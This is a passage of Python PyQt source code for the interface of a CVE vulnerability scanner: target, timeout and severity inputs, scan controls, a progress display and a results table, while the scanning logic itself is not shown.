        splitter.setHandleWidth(2)
        splitter.setStyleSheet("""
            QSplitter::handle {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #1f6feb, stop:1 #0969da);
                height: 2px;
            }
            QSplitter::handle:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #58a6ff, stop:1 #1f6feb);
            }
        """)
        
        top_panel = self.create_scan_panel()
        bottom_panel = self.create_results_panel()
        
        splitter.addWidget(top_panel)
        splitter.addWidget(bottom_panel)
        splitter.setSizes([280, 520])
        
        main_layout.addWidget(splitter, 1)
        
        self.setLayout(main_layout)
    
    def create_scan_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(12)
        
        config_group = QGroupBox('TARGET CONFIGURATION')
        config_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        config_layout = QVBoxLayout()
        
        url_layout = QHBoxLayout()
        url_label = QLabel('TARGET:')
        url_label.setStyleSheet('color: #c9d1d9; font-weight: bold; font-size: 11pt; min-width: 80px;')
        url_layout.addWidget(url_label)
        
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText('https://example.com')
        self.target_input.setMinimumHeight(40)
        self.target_input.setStyleSheet("""
            QLineEdit {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 6px;
                padding: 8px 12px;
                font-size: 11pt;
                font-family: 'Courier New';
            }
            QLineEdit:focus {
                border: 2px solid #1f6feb;
            }
        """)
        url_layout.addWidget(self.target_input, 1)
        config_layout.addLayout(url_layout)
        
        options_layout = QHBoxLayout()
        
        timeout_label = QLabel('TIMEOUT:')
        timeout_label.setStyleSheet('color: #8b949e; font-weight: bold; min-width: 80px;')
        options_layout.addWidget(timeout_label)
        
        self.timeout_combo = QComboBox()
        self.timeout_combo.addItems(['5s', '10s', '15s', '30s'])
        self.timeout_combo.setCurrentText('10s')
        self.timeout_combo.setMinimumHeight(32)
        self.timeout_combo.setStyleSheet("""
            QComboBox {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 4px;
                padding: 4px 8px;
                font-weight: bold;
            }
            QComboBox:hover {
                border: 2px solid #1f6feb;
            }
        """)
        options_layout.addWidget(self.timeout_combo)
        
        severity_label = QLabel('SEVERITY:')
        severity_label.setStyleSheet('color: #8b949e; font-weight: bold; min-width: 80px;')
        options_layout.addWidget(severity_label)
        
        self.severity_combo = QComboBox()
        self.severity_combo.addItems(['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'])
        self.severity_combo.setMinimumHeight(32)
        self.severity_combo.setStyleSheet("""
            QComboBox {
                background: #161b22;
                color: #c9d1d9;
                border: 2px solid #30363d;
                border-radius: 4px;
                padding: 4px 8px;
                font-weight: bold;
            }
            QComboBox:hover {
                border: 2px solid #1f6feb;
            }
        """)
        options_layout.addWidget(self.severity_combo)
        
        options_layout.addStretch()
        config_layout.addLayout(options_layout)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        control_layout = QHBoxLayout()
        
        self.scan_button = QPushButton('START SCAN')
        self.scan_button.setMinimumHeight(50)
        self.scan_button.clicked.connect(self.start_scan)
        self.scan_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #238636, stop:1 #1a6b2c);
                color: white;
                border: 2px solid #2ea043;
                border-radius: 8px;
                padding: 12px 24px;
                font-weight: bold;
                font-size: 13pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #2ea043, stop:1 #238636);
            }
            QPushButton:disabled {
                background: #21262d;
                color: #6e7681;
                border: 2px solid #30363d;
            }
        """)
        control_layout.addWidget(self.scan_button)
        
        self.stop_button = QPushButton('STOP')
        self.stop_button.setMinimumHeight(50)
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_scan)
        self.stop_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #da3633, stop:1 #b92222);
                color: white;
                border: 2px solid #f85149;
                border-radius: 8px;
                padding: 12px 24px;
                font-weight: bold;
                font-size: 13pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                           stop:0 #f85149, stop:1 #da3633);
            }
            QPushButton:disabled {
                background: #21262d;
                color: #6e7681;
                border: 2px solid #30363d;
            }
        """)
        control_layout.addWidget(self.stop_button)
        
        layout.addLayout(control_layout)
        
        progress_group = QGroupBox('SCAN PROGRESS')
        progress_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        progress_layout = QVBoxLayout()
        
        self.status_label = QLabel('Ready to scan')
        self.status_label.setStyleSheet('color: #58a6ff; font-size: 10pt; font-weight: bold;')
        progress_layout.addWidget(self.status_label)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setMinimumHeight(30)
        self.progress_bar.setValue(0)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                background: #161b22;
                border: 2px solid #30363d;
                border-radius: 6px;
                text-align: center;
                color: #c9d1d9;
                font-weight: bold;
                font-size: 11pt;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                           stop:0 #238636, stop:1 #2ea043);
                border-radius: 4px;
            }
        """)
        progress_layout.addWidget(self.progress_bar)
        
        stats_layout = QHBoxLayout()
        
        self.total_label = QLabel('TOTAL: 0')
        self.total_label.setStyleSheet('color: #c9d1d9; font-weight: bold; font-size: 10pt;')
        stats_layout.addWidget(self.total_label)
        
        self.critical_label = QLabel('CRITICAL: 0')
        self.critical_label.setStyleSheet('color: #f85149; font-weight: bold; font-size: 10pt;')
        stats_layout.addWidget(self.critical_label)
        
        self.high_label = QLabel('HIGH: 0')
        self.high_label.setStyleSheet('color: #d29922; font-weight: bold; font-size: 10pt;')
        stats_layout.addWidget(self.high_label)
        
        stats_layout.addStretch()
        progress_layout.addLayout(stats_layout)
        
        progress_group.setLayout(progress_layout)
        layout.addWidget(progress_group)
        
        return panel
    
    def create_results_panel(self):
        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(0, 0, 0, 0)
        
        results_group = QGroupBox('VULNERABILITIES DETECTED')
        results_group.setStyleSheet("""
            QGroupBox {
                color: #c9d1d9;
                font-weight: bold;
                border: 2px solid #30363d;
                border-radius: 8px;
                padding-top: 12px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
                color: #58a6ff;
            }
        """)
        
        results_layout = QVBoxLayout()
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(6)
        self.results_table.setHorizontalHeaderLabels(['CVE ID', 'Name', 'Severity', 'Score', 'Category', 'Found At'])
        
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(5, QHeaderView.ResizeMode.ResizeToContents)
        
        self.results_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setStyleSheet("""
            QTableWidget {
                background: #0d1117;
                alternate-background-color: #161b22;
                gridline-color: #30363d;
                border: 2px solid #30363d;
                border-radius: 6px;
                color: #c9d1d9;
            }
            QTableWidget::item {
                padding: 8px;
            }
            QTableWidget::item:selected {
                background: #1f6feb;
                color: white;
                font-weight: bold;
            }
            QHeaderView::section {
                background: #161b22;
                color: #c9d1d9;
                padding: 10px;
                border: none;
                border-right: 1px solid #30363d;
                font-weight: bold;
                font-size: 10pt;
            }
        """)
        
        results_layout.addWidget(self.results_table)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        return panel
    
    def start_scan(self):
        target = self.target_input.text().strip()
        
        if not target:
            self.status_label.setText('Error: Enter target URL')
            self.status_label.setStyleSheet('color: #f85149; font-size: 10pt; font-weight: bold;')
            return
        
        if not target.startswith('http'):
            target = 'https://' + target
        
        timeout = int(self.timeout_combo.currentText().replace('s', ''))
        severity = self.severity_combo.currentText()
        
        self.scan_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.target_input.setEnabled(False)
        self.results_table.setRowCount(0)
        self.vulnerabilities.clear()
        self.progress_bar.setValue(0)
        
        self.scan_thread = CVEScanThread(target, timeout, severity)
        self.scan_thread.progress_updated.connect(self.update_progress)
        self.scan_thread.status_updated.connect(self.update_status)
        self.scan_thread.cve_found.connect(self.add_vulnerability)
        self.scan_thread.scan_completed.connect(self.scan_finished)
        self.scan_thread.start()
    
    def stop_scan(self):
        if self.scan_thread:
            self.scan_thread.stop()
            self.scan_thread.wait()
        
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setEnabled(True)
        self.status_label.setText('Scan stopped')
        self.status_label.setStyleSheet('color: #d29922; font-size: 10pt; font-weight: bold;')
    
    def update_progress(self, value: int):
        self.progress_bar.setValue(value)
    
    def update_status(self, text: str):
        self.status_label.setText(text)
        self.status_label.setStyleSheet('color: #58a6ff; font-size: 10pt; font-weight: bold;')
    
    def add_vulnerability(self, vuln: dict):
        self.vulnerabilities.append(vuln)
        
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        self.results_table.setRowHeight(row, 35)
        
        cve_id = QTableWidgetItem(vuln['id'])
        cve_id.setFont(QFont('Courier New', 10, QFont.Weight.Bold))
        cve_id.setForeground(QColor('#58a6ff'))
        self.results_table.setItem(row, 0, cve_id)
        
        name = QTableWidgetItem(vuln['name'])
        name.setFont(QFont('Arial', 10))
        self.results_table.setItem(row, 1, name)
        
        severity = QTableWidgetItem(vuln['severity'])
        severity.setFont(QFont('Arial', 10, QFont.Weight.Bold))
        severity.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        
        if vuln['severity'] == 'CRITICAL':
            severity.setForeground(QColor('#f85149'))
        elif vuln['severity'] == 'HIGH':
            severity.setForeground(QColor('#d29922'))
        else:
            severity.setForeground(QColor('#58a6ff'))
        
        self.results_table.setItem(row, 2, severity)
        
        score = QTableWidgetItem(str(vuln['score']))
        score.setFont(QFont('Arial', 10, QFont.Weight.Bold))
        score.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 3, score)
        
        category = QTableWidgetItem(vuln['category'])
        category.setFont(QFont('Arial', 9))
        category.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 4, category)
        
        found_at = QTableWidgetItem(vuln['found_at'])
        found_at.setFont(QFont('Courier New', 9))
        found_at.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        self.results_table.setItem(row, 5, found_at)
        
        self.update_statistics()
    
    def update_statistics(self):
        total = len(self.vulnerabilities)
        critical = sum(1 for v in self.vulnerabilities if v['severity'] == 'CRITICAL')
        high = sum(1 for v in self.vulnerabilities if v['severity'] == 'HIGH')
        
        self.total_label.setText(f'TOTAL: {total}')
        self.critical_label.setText(f'CRITICAL: {critical}')
        self.high_label.setText(f'HIGH: {high}')
    
    def scan_finished(self, results: list):
        self.scan_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.target_input.setEnabled(True)
        self.progress_bar.setValue(100)
        
        if results:
            self.status_label.setText(f'Completed - {len(results)} vulnerabilities found')
            self.status_label.setStyleSheet('color: #2ea043; font-size: 10pt; font-weight: bold;')
        else:
            self.status_label.setText('Completed - No vulnerabilities found')
            self.status_label.setStyleSheet('color: #2ea043; font-size: 10pt; font-weight: bold;')
